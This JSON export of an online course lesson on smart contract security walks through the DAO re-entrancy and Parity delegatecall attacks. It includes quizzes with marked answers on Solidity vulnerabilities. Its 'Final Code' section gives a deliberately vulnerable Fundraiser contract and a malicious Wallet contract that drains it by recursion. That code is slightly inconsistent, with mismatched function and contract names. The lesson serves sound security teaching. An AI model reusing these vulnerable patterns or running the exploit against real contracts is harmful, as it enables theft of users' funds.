{
  "data": {
    "lesson": {
      "id": 791129,
      "key": "3afe1a1f-5b4d-4d91-af70-4ffe9814faf6",
      "title": "Smart Contract Security",
      "semantic_type": "Lesson",
      "is_public": true,
      "version": "1.0.0",
      "locale": "en-us",
      "summary": "Learn about recent security attacks, how to avoid common vulnerability and write secure smart contract code.",
      "lesson_type": "Classroom",
      "display_workspace_project_only": false,
      "resources": {
        "files": [
          {
            "name": "Videos Zip File",
            "uri": "https://zips.udacity-data.com/3afe1a1f-5b4d-4d91-af70-4ffe9814faf6/791129/1555417461345/Smart+Contract+Security+Videos.zip"
          },
          {
            "name": "Transcripts Zip File",
            "uri": "https://zips.udacity-data.com/3afe1a1f-5b4d-4d91-af70-4ffe9814faf6/791129/1555417457152/Smart+Contract+Security+Subtitles.zip"
          }
        ],
        "google_plus_link": null,
        "career_resource_center_link": null,
        "coaching_appointments_link": null,
        "office_hours_link": null,
        "aws_provisioning_link": null
      },
      "project": null,
      "lab": null,
      "concepts": [
        {
          "id": 791380,
          "key": "65403903-c49e-4a93-b58e-a289e7358698",
          "title": "Lesson Intro",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "65403903-c49e-4a93-b58e-a289e7358698",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791381,
              "key": "26a47f4c-0850-40f8-b86d-8c37a7b642d3",
              "title": "Lesson Intro",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "rtS8aaQKJ3Q",
                "china_cdn_id": "rtS8aaQKJ3Q.mp4"
              }
            }
          ]
        },
        {
          "id": 791382,
          "key": "797b5345-092d-49e3-9773-f5443f166e10",
          "title": "The DAO Attack",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "797b5345-092d-49e3-9773-f5443f166e10",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791391,
              "key": "e0f83b8b-7b41-408e-a2d2-e474557207f2",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# The DAO Attack \n---\n\nHere you'll learn about one of the biggest attacks to ever happen on the Ethereum network. This was known as the DAO attack, and accounted for the loss of around 60 million dollars worth of Ethereum. \n\nThere are many resources available that cover this attack, including [this article by coindesk](https://www.coindesk.com/understanding-dao-hack-journalists/). Coming up, we'll focus on this attack as a developer by taking a closer look at the code that made it happen. \n\n# Objectives\n___\n\n*Our goal is to help you do the following things.*\n\n1. Describe the DAO code \n2. Identify the code vulnerability\n3. Hack the vulnerable contract\n4. Fix the vulnerability",
              "instructor_notes": ""
            },
            {
              "id": 791392,
              "key": "83b3c5d2-bd02-4c8b-99d2-35ffeed20912",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ad85a_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/83b3c5d2-bd02-4c8b-99d2-35ffeed20912",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791398,
              "key": "6b6b127e-ce9d-4162-af0d-eed84cbf4cbb",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 1. Describe the DAO code\n___",
              "instructor_notes": ""
            },
            {
              "id": 791383,
              "key": "f7dfe57c-fe38-41ab-8169-97069c9ceead",
              "title": "The DAO Attack",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "E-O3W8DSIDY",
                "china_cdn_id": "E-O3W8DSIDY.mp4"
              }
            },
            {
              "id": 791395,
              "key": "db173ca8-de95-4402-89f4-bbf1dc43b1db",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ad8e1_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/db173ca8-de95-4402-89f4-bbf1dc43b1db",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791396,
              "key": "4541c1c0-8efc-4941-8f73-525dfc4ed604",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "Given the code presented in the video and the snippets provided below, can you spot the vulnerability in the **Fundraiser contract**?\n\n## Fundraiser\n___\n\n    pragma solidity ^0.4.24;\n\n    contract Fundraiser {\n        mapping(address=>uint) balances;\n\n        function withdrawCoins(){\n        }\n\n        function getBalance() constant returns (uint) {\n            return address(this).balance;\n        }\n\n        function contribute() payable {\n            balances[msg.sender] += msg.value;\n        }\n\n        function() payable {\n\n        }\n    }\n\n## Vulnerable Code Added to Fundraiser in Video\n___\n\n    uint withdrawAmount = balances[msg.sender];\n    Wallet wallet = Wallet(msg.sender);\n    wallet.payout.value(withdrawAmount)();\n    balances[msg.sender] = 0;\n\n## Wallet\n___\n\n    contract Wallet {\n        \n        Fundraiser fundraiser;\n\n        function Wallet(address fundraiserAddress) {\n            fundraiser = Fundraiser(fundraiserAddress);\n        }\n\n        function contribute(uint amount) {\n            fundraiser.contribute.value(amount)();\n        }\n        \n        function withdraw(){\n            fundraiser.withdrawCoins();\n        }\n\n        function getBalance() constant returns (uint) {\n            return address(this).balance;\n        }\n\n        function payout() payable {\n            }\n        }\n\n        function() payable {\n\n        }\n    }\n",
              "instructor_notes": ""
            }
          ]
        },
        {
          "id": 791384,
          "key": "f97dd398-1dc0-4c55-901b-dac8c2bc3cc8",
          "title": "Identify the Vulnerability",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "f97dd398-1dc0-4c55-901b-dac8c2bc3cc8",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791397,
              "key": "581b60ad-2bf7-4117-ac83-5bd673b70e54",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 2. Identify the Code Vulnerability\n\n---\n\nIn the video below, we'll explore the existing vulnerabilities in the contract we coded earlier in this concept.\n\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791385,
              "key": "2f3394cf-9f01-491b-b278-bfcf6dc03bf5",
              "title": "Identify The Vulnerability",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "qnLwyq4mzcQ",
                "china_cdn_id": "qnLwyq4mzcQ.mp4"
              }
            },
            {
              "id": 791393,
              "key": "9f25ea21-ca0d-48b6-9366-1e7e2a34529f",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ad897_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/9f25ea21-ca0d-48b6-9366-1e7e2a34529f",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            }
          ]
        },
        {
          "id": 791386,
          "key": "686239f5-e2b1-4578-9017-d694caa5942f",
          "title": "Hack the Contract",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "686239f5-e2b1-4578-9017-d694caa5942f",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791399,
              "key": "7b0660e1-ba82-4af6-b6d8-5b478688e0c4",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 3. Hack the Contract\n---\n\nIt's time to put yourself in the mind of the hacker! Now that we've coded up the contract and identified the vulnerability, we can go through and hack this contract for ourselves. \n",
              "instructor_notes": ""
            },
            {
              "id": 791387,
              "key": "521e2aab-af44-488e-86e0-2894dce0c5da",
              "title": "Hack The Contract",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "UjRc-mF_kdk",
                "china_cdn_id": "UjRc-mF_kdk.mp4"
              }
            },
            {
              "id": 791400,
              "key": "c560324a-c5f1-49d4-97d9-0f2b7b9ae976",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ad94f_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/c560324a-c5f1-49d4-97d9-0f2b7b9ae976",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            }
          ]
        },
        {
          "id": 791388,
          "key": "7191ce09-c370-427f-be47-7877afc92064",
          "title": "Prevent the Hack",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "7191ce09-c370-427f-be47-7877afc92064",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791402,
              "key": "1bf8c4ba-7a0d-4d6d-aee2-c52f9b671812",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 4. Fix the Vulnerability\n---\n\nIn this concept you learned to create a vulnerable contract and hack it for yourself. This last piece is small but very important. \n\n*How do you stop this hack from happening? *\n\nTake some time to think through this for yourself, and when you're ready you can see our explanation in the next video.\n",
              "instructor_notes": ""
            },
            {
              "id": 791389,
              "key": "bd51966e-9d1b-418e-85af-f58c5cb2748e",
              "title": "Prevent The Hack",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "nimfOmF7mvU",
                "china_cdn_id": "nimfOmF7mvU.mp4"
              }
            },
            {
              "id": 791403,
              "key": "9e55e719-aece-443b-bd79-9518e847f3e8",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Review\n___\n\nAt this point you have built a contract similar to that made in the DAO attack, hacked this contract for yourself, then fixed the existing vulnerability. There are other vulnerabilities that exist in smart contracts, and you can apply these same techniques to better understand each of them. Coming up, we'll go over some of these vulnerabilities and introduce how you can continue to research them for yourself.",
              "instructor_notes": ""
            }
          ]
        },
        {
          "id": 791390,
          "key": "05aa81ea-c722-4609-a20c-804860fdea65",
          "title": "Final Code",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "05aa81ea-c722-4609-a20c-804860fdea65",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791406,
              "key": "5484f4e0-502a-45fd-8e36-b581b968c469",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Final Code for Vulnerable Contract and Exploitation\n\nBelow is the entire program written throughout this section. It has both the the **Fundraiser contract** and the **malicious contract** written to hack the contract. You can deploy this in [remix](https://remix.ethereum.org/) to try for yourself.\n\n\n\n    pragma solidity ^0.4.24;\n\n    contract Fundraiser {\n        mapping(address=>uint) balances;\n\n        // VULNERABLE\n        function withdrawCoins(){\n            uint withdrawAmount = balances[msg.sender];\n            Wallet wallet = Wallet(msg.sender);\n            wallet.payout.value(withdrawAmount)();\n\n            // this line is not reached before the next recursion!!\n            balances[msg.sender] = 0;\n        }\n\n        function getBalance() constant returns (uint) {\n            return address(this).balance;\n        }\n\n        function contribute() payable {\n            balances[msg.sender] += msg.value;\n        }\n\n        function() payable {\n\n        }\n    }\n\n\n\n    contract Wallet {\n        \n        Fundraiser fundraiser;\n        uint recursion=20;\n\n        function Wallet(address fundraiserAddress) {\n            fundraiser = VulnerableFundraiser(fundraiserAddress);\n        }\n\n        function contribute(uint amount) {\n            fundraiser.contribute.value(amount)();\n        }\n        \n        function withdraw(){\n            fundraiser.withdrawAllMyCoins();\n        }\n\n        function getBalance() constant returns (uint) {\n            return address(this).balance;\n        }\n\n        function payout() payable {\n            // exploit\n            if(recursion>0) {\n                recursion--;\n                fundraiser.withdrawAllMyCoins();\n            }\n        }\n\n        function() payable {\n\n        }\n    }\n",
              "instructor_notes": ""
            },
            {
              "id": 791409,
              "key": "908c9b8e-5552-48e6-9428-c9a7694fb90e",
              "title": "Skill Tracker",
              "semantic_type": "TaskListAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "908c9b8e-5552-48e6-9428-c9a7694fb90e",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "tasks": [
                "1. Describe the DAO code",
                "2. Identify the code vulnerability",
                "3. Hack the vulnerable contract",
                "4. Fix the vulnerability"
              ],
              "positive_feedback": "Congratulations on gaining new skills!",
              "video_feedback": null,
              "description": "Track the objectives you've feel you've gained the skills to complete."
            }
          ]
        },
        {
          "id": 791407,
          "key": "94bf16c8-7a34-495c-bc9f-baef00c370bc",
          "title": "The Parity Attack",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "94bf16c8-7a34-495c-bc9f-baef00c370bc",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791410,
              "key": "c7569da7-5a66-40fb-a712-226b9c133fd5",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# The Parity Attack Overview\n---\n\nWelcome to this section on the **Parity Wallet Hack**! \n\nLike the DAO attack, the Parity Wallet Hack was another huge attack on the Ethereum network. It resulted in many millions of dollars in lost Ethereum. This again was covered in a lot of detail from a PR perspective (you can read more about that [here](https://www.coindesk.com/30-million-ether-reported-stolen-parity-wallet-breach/)). \n\nThough it was another attack, it was much different than the DAO attack for a few key reasons. In this section we'll go over the code, what made it vulnerable, and how it could have been prevented.\n\n# Objectives\n___\n\n*Our goal is to help you do the following things.*\n\n1. Describe the Parity wallet code\n2. Define fallback functions and delegate calls\n3. Exploit the Parity wallet code vulnerability\n\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791412,
              "key": "249114de-ee62-458c-9e4c-8fe6b068d5fa",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0ada6f_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/249114de-ee62-458c-9e4c-8fe6b068d5fa",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791411,
              "key": "062f92ac-7605-49df-94bc-25c751bf12d6",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 1. Describe the Parity wallet code\n___",
              "instructor_notes": ""
            },
            {
              "id": 791408,
              "key": "0206d91f-aa4f-40e8-8548-91e627808c87",
              "title": "The Parity Attack",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "wNOIJq0xPms",
                "china_cdn_id": "wNOIJq0xPms.mp4"
              }
            },
            {
              "id": 791413,
              "key": "217c4f53-aeb7-4fc2-8604-ae8fe003e341",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Parity Wallet Code Example\n___\n\nHere is a simplified version of the code as presented in the video. By stripping it down like this, I've also made it non-functional so you will not be able to run this in the Remix editor. Instead, think about the concepts provided to determine where you think the vulnerability might be.\n\n    contract Library {\n        function initWallet() {\n            // code\n        }\n\n        function addOwner(address owner) {\n            // code\n        }\n\n        function isOwner(address _addr) constant returns (bool) {\n            // code\n        }\n    }\n\n    contract Wallet {\n       function isOwner(address _addr) constant returns (bool) {\n           return _walletLibrary.delegatecall(msg.data);\n       }\n\n        function() {\n            _walletLibrary.delegatecall(msg.data)\n        }\n\n    }",
              "instructor_notes": ""
            },
            {
              "id": 791415,
              "key": "0d170616-8a76-4d19-87f9-ca3259575fe6",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 2. Define fallback functions and delegate calls\n___\n\n**Delegate calls** and **Fallback functions** are an important part of what made the Parity Wallet hack possible. View the additional documentation, provided below, to better understand how these work. Keep in mind that both of these are important parts of the Solidity language. They will come up in code you write in the future and are important to understand outside of this unique situation.\n\n> [Delegate call documentation](https://solidity.readthedocs.io/en/v0.4.24/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)\n\n> [Fallback function documentation](https://solidity.readthedocs.io/en/v0.4.24/contracts.html#fallback-function )\n",
              "instructor_notes": ""
            }
          ]
        },
        {
          "id": 791414,
          "key": "502954de-e1e6-4f31-8037-8afaac6365e4",
          "title": "The Parity Attack Solution",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "502954de-e1e6-4f31-8037-8afaac6365e4",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791418,
              "key": "75078694-f113-4a49-858c-358582b605ec",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## 3. Exploit the Parity wallet code vulnerability\n---\n\nNow that you've had the chance to think about this problem, we'll go over the solution to this problem. Check out the video below to see what made this hack possible.",
              "instructor_notes": ""
            },
            {
              "id": 791417,
              "key": "5130644c-0a13-451d-8817-df44aef91df5",
              "title": "The Parity Attack Solution",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "TlvSI6iO-GU",
                "china_cdn_id": "TlvSI6iO-GU.mp4"
              }
            },
            {
              "id": 814411,
              "key": "bf763b41-e207-46ec-8bed-bb1440efbe1a",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Resources: #\n\n[Delegate call](https://solidity.readthedocs.io/en/v0.4.24/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries) \n\n[Fallback functions](https://solidity.readthedocs.io/en/v0.4.24/contracts.html#fallback-function)\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791420,
              "key": "cc7451cf-ec9a-4af5-b0d9-0f530cd05c15",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Review\n___\n\nYou now know the cause of another huge attack on the Ethereum network. As you can see, the solutions are often simple. It takes careful review and understanding of some new concepts to understand how you can protect this from happening in your code.",
              "instructor_notes": ""
            },
            {
              "id": 791421,
              "key": "734f5467-c196-4da1-8b42-54c66911140f",
              "title": "Skill Tracker",
              "semantic_type": "TaskListAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "734f5467-c196-4da1-8b42-54c66911140f",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "tasks": [
                "1. Describe the Parity wallet code",
                "2. Define fallback functions and delegate calls",
                "3. Exploit the Parity wallet code vulnerability",
                "4. Fix the vulnerability"
              ],
              "positive_feedback": "Congratulations on gaining new skills!",
              "video_feedback": null,
              "description": "Track the objectives you've feel you've gained the skills to complete."
            }
          ]
        },
        {
          "id": 791422,
          "key": "25423b81-345e-4f85-b70e-271f8d0ced73",
          "title": "Solidity Security Considerations",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "25423b81-345e-4f85-b70e-271f8d0ced73",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791424,
              "key": "8dfb1fb6-1af5-4cb7-8fc1-1739c8959c9e",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Solidity Security Considerations Overview\n---\n\nHaving gone over some of the more well known attacks, we'll turn our attention to more general advice for making safe and secure contracts. These ideas give a broader look at all the standards you need to consider, and the documentation we'll go over provides great support for continued research in this area.\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791423,
              "key": "267f1fbc-557b-4679-8dbf-518f8c3b1382",
              "title": "C5L5-04 SC Solidity Security Considerations",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "T4_hqU2MTCY",
                "china_cdn_id": "T4_hqU2MTCY.mp4"
              }
            },
            {
              "id": 791425,
              "key": "8fbcb9e5-8864-4eb5-aed4-d065f2be0c28",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Resources\n___\n\nTake some time now to read through each of the resources covered throughout this section. As a general note, the **security considerations** are the most important to read through right now, the **common patterns** are an excellent reference to learn new skills, and the **style guide** is best to reference as you are writing code for general tips and advice.\n\n[Solidity Documentation](https://solidity.readthedocs.io/en/latest/index.html)\n\n[Security Considerations](https://solidity.readthedocs.io/en/latest/security-considerations.html)\n\n[Common Patterns](https://solidity.readthedocs.io/en/latest/common-patterns.html)\n\n[Style Guide](https://solidity.readthedocs.io/en/latest/style-guide.html)",
              "instructor_notes": ""
            },
            {
              "id": 791426,
              "key": "f2760d92-097c-4805-bef7-e85e072a97d5",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Define the Vulnerability\n___\n",
              "instructor_notes": ""
            },
            {
              "id": 791427,
              "key": "124a7758-c933-4442-b786-498c95000cec",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "Reference this code to answer the quiz below it.\n```\n\npragma solidity >=0.4.0 <0.6.0;\n\n// THIS CONTRACT CONTAINS A BUG - DO NOT USE\ncontract Fund {\n    /// Mapping of ether shares of the contract.\n    mapping(address => uint) shares;\n    /// Withdraw your share.\n    function withdraw() public {\n        if (msg.sender.send(shares[msg.sender]))\n            shares[msg.sender] = 0;\n    }\n}\n\n```",
              "instructor_notes": ""
            },
            {
              "id": 791428,
              "key": "248a4d6c-eedc-4062-b6c4-281d8664d6ef",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "248a4d6c-eedc-4062-b6c4-281d8664d6ef",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "Which type of vulnerability exists in the code above?",
                "answers": [
                  {
                    "id": "a1544215546062",
                    "text": "Tx.origin",
                    "is_correct": false
                  },
                  {
                    "id": "a1544215553998",
                    "text": "Re-Entrancy",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215564133",
                    "text": "Gas Limit and Loops",
                    "is_correct": false
                  },
                  {
                    "id": "a1544215570694",
                    "text": "Underflows",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791429,
              "key": "fdb09c49-6d66-4eb8-b824-0c9b0d800760",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "> Tip: View [Security Considerations](https://solidity.readthedocs.io/en/latest/security-considerations.html) for more details on the quiz above.",
              "instructor_notes": ""
            },
            {
              "id": 791430,
              "key": "78e40f14-37fa-4cc7-b4a3-b3e12fa33862",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Solidity Recommendations \n___",
              "instructor_notes": ""
            },
            {
              "id": 791431,
              "key": "337b5f22-3ee5-43b1-9c2a-923fdba4742f",
              "title": "",
              "semantic_type": "CheckboxQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "337b5f22-3ee5-43b1-9c2a-923fdba4742f",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "Which recommendations does solidity provide for developing smart contracts?",
                "answers": [
                  {
                    "id": "a1544215618238",
                    "text": "Take warnings seriously",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215625408",
                    "text": "Restrict the Amount of Ether",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215635481",
                    "text": "Keep it Small and Modular",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215641217",
                    "text": "Use the Checks-Effects-Interactions Pattern",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215648052",
                    "text": "Include a Fail-Safe Mode",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215653974",
                    "text": "Ask for Peer Review",
                    "is_correct": true
                  }
                ]
              }
            }
          ]
        },
        {
          "id": 791434,
          "key": "2af893cf-fdce-4773-9b48-d829df35bdc7",
          "title": "Consensys: Smart Contract Best Practices",
          "semantic_type": "Concept",
          "is_public": true,
          "user_state": {
            "node_key": "2af893cf-fdce-4773-9b48-d829df35bdc7",
            "completed_at": null,
            "last_viewed_at": null,
            "unstructured": null
          },
          "resources": null,
          "atoms": [
            {
              "id": 791436,
              "key": "efb61aab-1a88-4d41-bded-e451cebce2bf",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "# Smart Contract Best Practices\n---\nThe Solidity documentation provides resources to help get you started, but there are many more resources you can use for reference. In blockchain security it's important to understand many of the most current resources available. In this section we'll go over another great resource created by Consensys you can reference.\n\nConsensys, an incubator for blockchain startups, has curated a list of [Ethereum Smart Contract Security Best Practices](https://consensys.github.io/smart-contract-best-practices/). For more information about this resource, check out the video below.\n\n# Objectives\n___\n\n*Our goal is to help you do the following things.*\n\n* introduce you to Consensys \n\n\n",
              "instructor_notes": ""
            },
            {
              "id": 791437,
              "key": "b69ed441-5b1b-46ad-bced-c973a07fd872",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0add12_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/b69ed441-5b1b-46ad-bced-c973a07fd872",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791435,
              "key": "8c6fbe90-2579-49de-b108-deb627290aae",
              "title": "Consensys Smart Contract Best Practices",
              "semantic_type": "VideoAtom",
              "is_public": true,
              "instructor_notes": "",
              "video": {
                "youtube_id": "yEHTqLVWgIg",
                "china_cdn_id": "yEHTqLVWgIg.mp4"
              }
            },
            {
              "id": 791438,
              "key": "841dd502-fcb7-4f04-8236-868746224adf",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0add24_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/841dd502-fcb7-4f04-8236-868746224adf",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791439,
              "key": "90a312f8-15e3-4041-95bf-8f1ec77a0872",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Resources\n___\n\n[Consensys Home Page](https://new.consensys.net/)\n\n[Ethereum Smart Contract Best Practices](https://consensys.github.io/smart-contract-best-practices/)",
              "instructor_notes": ""
            },
            {
              "id": 791440,
              "key": "60083725-fd02-4e2d-8db5-2da243baa931",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Exploit the Contract\n___",
              "instructor_notes": ""
            },
            {
              "id": 791441,
              "key": "883b778e-b396-4412-ab96-fa12bc30e738",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "Reference this code to answer the quiz below it.\n```\n// INSECURE\ncontract Auction {\n    address currentLeader;\n    uint highestBid;\n\n    function bid() payable {\n        require(msg.value > highestBid);\n\n        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert\n\n        currentLeader = msg.sender;\n        highestBid = msg.value;\n    }\n}\n```",
              "instructor_notes": ""
            },
            {
              "id": 791442,
              "key": "b0916431-41c7-4df1-aea6-90a0f8723b8b",
              "title": "",
              "semantic_type": "RadioQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "b0916431-41c7-4df1-aea6-90a0f8723b8b",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "How could a hacker exploit the code shown above?",
                "answers": [
                  {
                    "id": "a1544215884204",
                    "text": "Change the value of highest bid to make themselves the highest bidder.",
                    "is_correct": false
                  },
                  {
                    "id": "a1544215893026",
                    "text": "Update the address of the currentLeader to be the address of their wallet.",
                    "is_correct": false
                  },
                  {
                    "id": "a1544215898437",
                    "text": "Prevent other users from calling the bid() function, allowing them to stay the leader forever.",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215904894",
                    "text": "None of these options would exploit the contracts weakness.",
                    "is_correct": false
                  }
                ]
              }
            },
            {
              "id": 791443,
              "key": "b2930f18-4095-4c17-9ffd-33ddce2e4e23",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "> Tip: You can read through the resource provided at [DOS with (Unexpected) revert](https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-unexpected-revert) for more information. ",
              "instructor_notes": ""
            },
            {
              "id": 791444,
              "key": "e984bbe9-ec6e-4942-8449-2476dcddba84",
              "title": null,
              "semantic_type": "ImageAtom",
              "is_public": true,
              "url": "https://video.udacity-data.com/topher/2018/December/5c0add82_blockchain-line/blockchain-line.png",
              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/e984bbe9-ec6e-4942-8449-2476dcddba84",
              "caption": "",
              "alt": "",
              "width": 75,
              "height": 75,
              "instructor_notes": null
            },
            {
              "id": 791445,
              "key": "9056cc64-9117-4c9c-940a-d92c15834fd6",
              "title": null,
              "semantic_type": "TextAtom",
              "is_public": true,
              "text": "## Quiz: Consensys General Philosophy\n___",
              "instructor_notes": ""
            },
            {
              "id": 791446,
              "key": "df36e799-4544-482a-be66-35239b76907d",
              "title": "",
              "semantic_type": "CheckboxQuizAtom",
              "is_public": true,
              "instructor_notes": null,
              "user_state": {
                "node_key": "df36e799-4544-482a-be66-35239b76907d",
                "completed_at": null,
                "last_viewed_at": null,
                "unstructured": null
              },
              "question": {
                "prompt": "Which of the following are tips from Consensys about the **general philosophy** of creating secure smart contracts?",
                "answers": [
                  {
                    "id": "a1544215968336",
                    "text": "Prepare for failure",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215975512",
                    "text": "Rollout carefully",
                    "is_correct": true
                  },
                  {
                    "id": "a1544215986929",
                    "text": "Keep contracts simple",
                    "is_correct": true
                  },
